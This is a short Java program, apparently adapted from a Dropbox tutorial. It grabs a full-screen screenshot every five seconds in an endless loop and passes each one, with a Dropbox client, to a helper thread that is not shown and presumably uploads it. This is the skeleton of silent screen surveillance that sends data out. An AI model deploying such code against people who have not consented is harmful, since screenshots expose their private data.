import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import java.awt.*;
import java.awt.image.BufferedImage;

public class Main {

    private static final String ACCESS_TOKEN = "<ACCESS TOKEN>";

    public static void main(String[] args) {
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        while (true) {
            BufferedImage screenCapture = null;
            try {
                screenCapture = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            } catch (AWTException e) {
                e.printStackTrace();
            }
            MyThread thread = new MyThread(screenCapture, client);

            thread.start();
            try {
                thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

}